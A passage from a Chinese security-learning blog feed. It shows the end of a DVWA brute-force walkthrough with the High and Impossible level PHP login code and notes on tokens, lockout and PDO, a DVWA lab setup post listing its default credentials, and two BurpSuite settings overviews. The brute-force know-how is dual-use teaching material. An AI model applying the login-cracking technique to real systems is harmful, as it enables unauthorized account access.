src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073609811.png" alt></p><p>同样在响应头提取welcome</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073619831.png" alt></p><p>等待筛选到的welcome即可</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073630632.png" alt></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Login&apos; ] ) &amp;&amp; isset ($_POST[&apos;username&apos;]) &amp;&amp; isset ($_POST[&apos;password&apos;]) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_POST[ &apos;username&apos; ];</span><br><span class="line">$user = stripslashes( $user );</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_POST[ &apos;password&apos; ];</span><br><span class="line">$pass = stripslashes( $pass );</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">// Default values</span><br><span class="line">$total_failed_login = 3;</span><br><span class="line">$lockout_time = 15;</span><br><span class="line">$account_locked = false;</span><br><span class="line"></span><br><span class="line">// Check the database (Check user information)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// Check to see if the user has been locked out.</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) &#123;</span><br><span class="line">// User locked out. Note, using this method would allow for user enumeration!</span><br><span class="line">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">// Calculate when the user would be allowed to login again</span><br><span class="line">$last_login = strtotime( $row[ &apos;last_login&apos; ] );</span><br><span class="line">$timeout = $last_login + ($lockout_time * 60);</span><br><span class="line">$timenow = time();</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// Check to see if enough time has passed, if it hasn&apos;t locked the account</span><br><span class="line">if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">$account_locked = true;</span><br><span class="line">// print &quot;The account is locked&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Check the database (if username matches the password)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR);</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// If its a valid login...</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$avatar = $row[ &apos;avatar&apos; ];</span><br><span class="line">$failed_login = $row[ &apos;failed_login&apos; ];</span><br><span class="line">$last_login = $row[ &apos;last_login&apos; ];</span><br><span class="line"></span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">// Had the account been locked out since last login?</span><br><span class="line">if( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Reset bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line"></span><br><span class="line">// Give the user some feedback</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">// Update bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set the last login time</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到代码中加入了stripslashes()函数对用户名和密码去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个。<br>同时加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。</p><p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p><p>由于加入了Anti-CSRFtoken预防无脑爆破，token的值三随机变化的用burp不容易爆破成功。所以需要自己写python脚本html页面中抓取user_token的值然后进行爆破。由于python还没有学，这里先留个坑以后填Impossible级别</p><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Login&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_POST[ &apos;username&apos; ];</span><br><span class="line">$user = stripslashes( $user );</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_POST[ &apos;password&apos; ];</span><br><span class="line">$pass = stripslashes( $pass );</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line">// Default values</span><br><span class="line">$total_failed_login = 3;</span><br><span class="line">$lockout_time = 15;</span><br><span class="line">$account_locked = false;</span><br><span class="line">// Check the database (Check user information)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line">// Check to see if the user has been locked out.</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) &#123;</span><br><span class="line">// User locked out. Note, using this method would allow for user enumeration!</span><br><span class="line">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><span class="line">// Calculate when the user would be allowed to login again</span><br><span class="line">$last_login = strtotime( $row[ &apos;last_login&apos; ] );</span><br><span class="line">$timeout = $last_login + ($lockout_time * 60);</span><br><span class="line">$timenow = time();</span><br><span class="line">/*</span><br><span class="line">print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">*/</span><br><span class="line">// Check to see if enough time has passed, if it hasn&apos;t locked the account</span><br><span class="line">if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">$account_locked = true;</span><br><span class="line">// print &quot;The account is locked&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// Check the database (if username matches the password)</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR);</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line">// If its a valid login...</span><br><span class="line">if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$avatar = $row[ &apos;avatar&apos; ];</span><br><span class="line">$failed_login = $row[ &apos;failed_login&apos; ];</span><br><span class="line">$last_login = $row[ &apos;last_login&apos; ];</span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">// Had the account been locked out since last login?</span><br><span class="line">if( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">// Reset bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( rand( 2, 4 ) );</span><br><span class="line">// Give the user some feedback</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</span><br><span class="line">// Update bad login count</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line">// Set the last login time</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>相比于High难度，当输入错误failed_login=3，$last_login + ($lockout_time * 60); 锁定15分钟以及随机sleep(rand(2,4)),防止了爆破。<br>而且在与数据库交互时采用PDO（PHP Data Object，PHP数据对象）机制。<br>因为两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。</p><p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符 ? 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL攻击者没有一点机会。</p><p><a href="https://link.jianshu.com/?t=http://www.freebuf.com/articles/web/116437.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之Brute Force</a></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（二）Brute Force（暴力破解模块）&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（一）环境搭建</title>
    <link href="http://archimesan.me/2018/05/01/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://archimesan.me/2018/05/01/DVWA学习（一）环境搭建/</id>
    <published>2018-05-01T11:10:12.000Z</published>
    <updated>2019-03-26T15:18:40.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（一）环境搭建<br><a id="more"></a></p><h1 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h1><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/图片.png.png" alt="图片.png"></p><p>DVWA共有十个模块，分别是:<br>1.Brute Force（暴力（破解））<br>2.Command Injection（命令行注入）<br>3.CSRF（跨站请求伪造）<br>4.File Inclusion（文件包含）<br>5.File Upload（文件上传）<br>6.Insecure CAPTCHA （不安全的验证码）<br>7.SQL Injection（SQL注入）<br>8.SQL Injection（Blind）（SQL盲注）<br>9.XSS（Reflected）（反射型跨站脚本）<br>10.XSS（Stored）（存储型跨站脚本）</p><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。环境搭建</p><p>安装ubuntu-server16.04虚拟机NAT模式。<br>Apache/2.4.18 (Ubuntu)<br>PHP 5.6.35-1+ubuntu16.04.1+deb.sury.org+1 (cli)<br>MySQL5.7.21-0ubuntu0.16.04.1<br>查看虚拟机动态ip</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/20190326071352963.png" alt></p><p>外部主机成功访问虚拟机服务器中的DVWA网站：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/20190326071423525.png" alt></p><p>DVWA默认的用户有5个，用户名密码如下（一个足以）：</p><p>admin/password<br>gordonb/abc123<br>1337/charley<br>pablo/letmein<br>smithy/password</p><p>数据库中的密码用了md5加密</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（一）环境搭建/20190326071459403.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（一）环境搭建&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之User options模块</title>
    <link href="http://archimesan.me/2018/04/29/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BUser-options%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/29/BurpSuite系列之User-options模块/</id>
    <published>2018-04-29T11:02:23.000Z</published>
    <updated>2019-03-26T15:18:40.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之User options模块(用户选择)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>User options模块主要用来配置一些常用的选项。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>User options主要由4个模块组成:<br>1.Connections 连接<br>2.SSL<br>3.Display<br>4.Misc  杂项</p><h2 id="Connections-连接"><a href="#Connections-连接" class="headerlink" title="Connections 连接"></a>Connections 连接</h2><p>选项1：Platform Authentication<br>选项2：Upstream Proxy Servers</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/ .png" alt=" "></p><p>选项3：Socks Proxy</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070457818.png" alt></p><h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>选项1：Java SSL Options<br>选项2：Client SSL Certificates</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070540770.png" alt></p><h2 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h2><p>选项1：User Interface<br>选项2：Http Message Display<br>选项3：Character Sets</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070549707.png" alt></p><h2 id="Misc-杂项"><a href="#Misc-杂项" class="headerlink" title="Misc  杂项"></a>Misc  杂项</h2><p>选项1：Hotkeys<br>选项2：Logging</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070623343.png" alt></p><p>选项3：Temporary Files Location<br>选项4：Proxy Interception<br>选项5：Performance Feedback</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070635952.png" alt> </p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite系列之User options模块(用户选择)&lt;br&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Project options模块</title>
    <link href="http://archimesan.me/2018/04/20/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProject-options%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/04/20/BurpSuite系列之Project-options模块/</id>
    <published>2018-04-20T10:54:15.000Z</published>
    <updated>2019-03-26T15:18:40.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Project options模块(项目选择)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Project options主要用来对Project的一些设置。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>Project options主要由五个模块组成:</p><p>1.Connections 连接<br>2.HTTP<br>3.SSL<br>4.Sessions<br>5.Misc  杂项</p><h2 id="Connections-连接"><a href="#Connections-连接" class="headerlink" title="Connections 连接"></a>Connections 连接</h2><p>选项1：Platform Authentication<br>选项2：Upstream proxy servers<br>选项3：Socks proxy<br>选项4：Timeouts</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065636340.png" alt></p><p>选项5：Hosname Resolution<br>选项6：Out-of-scope Requests</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065644947.png" alt></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>选项1：Redirections<br>选项2：Streaming responses</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065654000.png" alt></p><p>选项3：status 100 responses</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065717425.png" alt></p><h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>选项1：SSL Negotiation<br>选项2：Client SSL Certificates<br>选项3：Server SSL Certificates</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065732041.png" alt></p><h2 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h2><p>选项1：Session Handling Rules<br>选项2：Cookie Jar</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065741753.png" alt></p><p>选项3：Macros</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065749173.png" alt></p><h2 id="Misc-杂项"><a href="#Misc-杂项" class="headerlink" title="Misc  杂项"></a>Misc  杂项</h2><p>选项1：Scheduled Tasks<br>选项2：Burp Collaborator Server</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065759018.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
